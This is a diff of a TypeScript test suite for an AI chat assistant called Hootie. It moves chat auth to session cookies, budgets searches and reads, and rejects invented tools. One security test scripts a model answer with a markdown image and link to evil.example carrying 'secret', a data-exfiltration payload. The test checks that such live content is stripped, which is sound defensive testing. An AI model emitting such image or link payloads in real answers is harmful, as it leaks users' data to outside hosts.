@@ -20,10 +20,28 @@ import { flushAccessLog, resetAccessThrottle } from "../src/governance/access-lo
 import {
   setupTestEnv,
   createTestApp,
-  registerUser,
+  registerUser as registerUserWithKey,
   jsonRequest,
   resetAuthRateLimit,
 } from "./helpers.js";
+
+/**
+ * Hootie runs only as a signed-in person (H1, AC-H1-07): the chat route
+ * refuses every API key. The suites below still name people by their key for
+ * the REST setup calls; the chat helpers swap it for that person's session.
+ */
+const sessionFor = new Map<string, string>();
+async function registerUser(app: any, email: string, name?: string) {
+  const u = await registerUserWithKey(app, email, name);
+  sessionFor.set(u.apiKey, u.cookie);
+  return u;
+}
+/** The headers a chat call sends: the person's session cookie. */
+function chatAuth(apiKey: string): Record<string, string> {
+  const cookie = sessionFor.get(apiKey);
+  if (!cookie) throw new Error("chat needs a session: register this user through the local registerUser");
+  return { Cookie: cookie };
+}
 
 interface SseEvent {
   event: string;
@@ -78,7 +96,7 @@ async function chatRaw(
   apiKey?: string,
 ) {
   const headers: Record<string, string> = { "Content-Type": "application/json" };
-  if (apiKey) headers.Authorization = `Bearer ${apiKey}`;
+  if (apiKey) Object.assign(headers, chatAuth(apiKey));
   const res = await app.request(`/nests/${nestId}/chat`, {
     method: "POST",
     headers,
@@ -583,7 +601,7 @@ describe("POST /nests/:id/chat — Hootie in the nest", () => {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
-          Authorization: `Bearer ${reader.apiKey}`,
+          ...chatAuth(reader.apiKey),
         },
         body: JSON.stringify({ message: "tell me everything" }),
       });
@@ -828,6 +846,30 @@ describe("POST /nests/:id/chat — Hootie in the nest", () => {
     const { status, json } = await chat(app, nestId, { message: "   " }, reader.apiKey);
     expect(status).toBe(400);
     expect(json.error).toMatch(/message/i);
+  });
+
+  it("security r2 N1: the posted comment carries no live image or link from the model's answer", async () => {
+    scriptedAnswer =
+      "Tokens: ![pixel](https://evil.example/p?d=secret) see [the guide](https://evil.example/a) " +
+      "and [[API Authentication Guide]]. N1_MARKER";
+    const { status } = await chat(
+      app,
+      nestId,
+      { message: `@${owner.email} where do tokens come from?`, node_id: authNodeId },
+      reader.apiKey,
+    );
+    expect(status).toBe(200);
+    const { data: threads } = await jsonRequest(app, "GET", `/nests/${nestId}/nodes/${authNodeId}/annotations`, undefined, reader.apiKey);
+    const posted = threads.threads.find((t: any) => t.comments[0].body.includes("N1_MARKER"));
+    expect(posted).toBeTruthy();
+    const body: string = posted.comments[0].body;
+    expect(body).not.toContain("](http");
+    expect(body).not.toContain("![");
+    expect(body).not.toContain("evil.example");
+    // The words survive: alt text and link text.
+    expect(body).toContain("pixel");
+    expect(body).toContain("the guide");
+    expect(body).toContain("[[API Authentication Guide]]");
   });
 
   it("@mentioning someone posts the exchange as a comment on the open document and notifies them", async () => {
@@ -1394,6 +1436,18 @@ describe("POST /nests/:id/chat — artifact anchor and citation links", () => {
 // ─── Ticket B: Hootie searches again when the first retrieval doesn't answer ───
 // Engineering Ops task: community-nest-hootie-searches-again-when-the-first-
 // retrieval-does-not-answer.
+/** Hootie's registry since H1: B's search plus the seven read tools. */
+const HOOTIE_TOOLS = [
+  "search_nest",
+  "get_node",
+  "list_nodes",
+  "list_boards",
+  "board_items",
+  "review_queue",
+  "node_fields",
+  "node_relations",
+];
+
 describe("POST /nests/:id/chat — searching again (search_nest)", () => {
   let app: any;
   let owner: { apiKey: string; email: string; userId: string };
@@ -1461,7 +1515,7 @@ describe("POST /nests/:id/chat — searching again (search_nest)", () => {
     const { status, events } = await chat(app, nestId, { message: question }, stranger.apiKey);
     expect(status).toBe(200);
     expect(modelRounds).toHaveLength(2);
-    expect(modelRounds[0].tools).toEqual(["search_nest"]);
+    expect(modelRounds[0].tools).toEqual(HOOTIE_TOOLS);
     expect(modelRounds[0].toolChoice).toBe("auto");
     expect(modelRounds[0].system).not.toContain("HUB_SENTINEL");
     expect(modelRounds[0].system).toContain("search_nest");
@@ -1539,18 +1593,40 @@ describe("POST /nests/:id/chat — searching again (search_nest)", () => {
     // none, and its calls were not run.
     expect(modelRounds).toHaveLength(2);
     expect(modelRounds[1].toolChoice).toBe("none");
-    expect(events.find((e) => e.event === "done")!.data.answer).toBe("");
+    // H1 (§3.12): a refused over-budget call ends the looking, and the answer
+    // says so in the fixed line.
+    expect(events.find((e) => e.event === "done")!.data.answer).toBe("I stopped looking after 2 searches and 0 reads.");
   });
 
-  it("the round after the cap is tool_choice none, and its text is the answer", async () => {
+  it("searches spent, reads remain: the next round still has tools; a 3rd search is refused and ends the looking", async () => {
+    // H1 (§3.12): searches and reads are budgeted separately. Two searches
+    // spend the search budget but not the reads, so round 3 still offers
+    // tools; asking for a third search is what switches the loop to answer.
+    scriptedRounds = [
+      { calls: [{ name: "search_nest", input: { query: "one" } }] },
+      { calls: [{ name: "search_nest", input: { query: "two" } }] },
+      { calls: [{ name: "search_nest", input: { query: "three" } }] },
+      { text: "The nest doesn't say." },
+    ];
+    const { events } = await chat(app, nestId, { message: question }, stranger.apiKey);
+    expect(modelRounds.map((r) => r.toolChoice)).toEqual(["auto", "auto", "auto", "none"]);
+    expect(events.filter((e) => e.event === "status")).toHaveLength(2);
+    const refused = modelRounds[3].messages.at(-1).content[0];
+    expect(refused).toEqual(expect.objectContaining({ is_error: true }));
+    expect(refused.content).toMatch(/No more searches/);
+    expect(events.find((e) => e.event === "done")!.data.answer).toBe(
+      "The nest doesn't say.\n\nI stopped looking after 2 searches and 0 reads.",
+    );
+  });
+
+  it("two searches and an answer, nothing refused: no stopped-looking line", async () => {
     scriptedRounds = [
       { calls: [{ name: "search_nest", input: { query: "one" } }] },
       { calls: [{ name: "search_nest", input: { query: "two" } }] },
       { text: "The nest doesn't say." },
     ];
     const { events } = await chat(app, nestId, { message: question }, stranger.apiKey);
-    expect(modelRounds.map((r) => r.toolChoice)).toEqual(["auto", "auto", "none"]);
-    expect(events.filter((e) => e.event === "status")).toHaveLength(2);
+    expect(modelRounds.map((r) => r.toolChoice)).toEqual(["auto", "auto", "auto"]);
     expect(events.find((e) => e.event === "done")!.data.answer).toBe("The nest doesn't say.");
   });
 
@@ -1568,12 +1644,15 @@ describe("POST /nests/:id/chat — searching again (search_nest)", () => {
     expect(events.find((e) => e.event === "done")!.data.answer).toBe("Done.");
   });
 
-  it("unknown tool calls count against the cap — a model inventing tools can't loop", async () => {
+  it("an unknown tool call is a rejected call — a model inventing tools can't loop", async () => {
     const bogus = { name: "delete_everything", input: {} };
-    scriptedRounds = [{ calls: [bogus] }, { calls: [bogus] }, { calls: [bogus], text: "Done." }, { text: "never" }];
+    scriptedRounds = [{ calls: [bogus] }, { calls: [bogus], text: "Done." }, { text: "never" }];
     const { events } = await chat(app, nestId, { message: question }, stranger.apiKey);
-    expect(modelRounds.map((r) => r.toolChoice)).toEqual(["auto", "auto", "none"]);
-    expect(events.find((e) => e.event === "done")!.data.answer).toBe("Done.");
+    // The first invented name makes the rest of the turn answer-only.
+    expect(modelRounds.map((r) => r.toolChoice)).toEqual(["auto", "none"]);
+    const done = events.find((e) => e.event === "done")!.data;
+    expect(done.answer).toBe("Done.");
+    expect(done.answer_only).toBe("rejected_call");
   });
 
   it("a model or gateway that rejects tools still answers — broadening a weak first retrieval itself", async () => {
@@ -1596,7 +1675,7 @@ describe("POST /nests/:id/chat — searching again (search_nest)", () => {
     const { status, events } = await chat(app, nest, { message: "when does testing begin?" }, owner.apiKey);
     expect(status).toBe(200);
     expect(modelRounds).toHaveLength(2);
-    expect(modelRounds[0].tools).toEqual(["search_nest"]);
+    expect(modelRounds[0].tools).toEqual(HOOTIE_TOOLS);
     expect(modelRounds[0].system).not.toContain("PILOT_SENTINEL");
     // The answer round: no tools, and the broadened context — relaxed
     // keywords, then the top hit's neighbours.
@@ -1650,7 +1729,7 @@ describe("POST /nests/:id/chat — searching again (search_nest)", () => {
     resetAccessThrottle();
     const res = await app.request(`/nests/${nestId}/chat`, {
       method: "POST",
-      headers: { "Content-Type": "application/json", Authorization: `Bearer ${stranger.apiKey}` },
+      headers: { "Content-Type": "application/json", ...chatAuth(stranger.apiKey) },
       body: JSON.stringify({ message: question }),
     });
     expect(res.status).toBe(200);
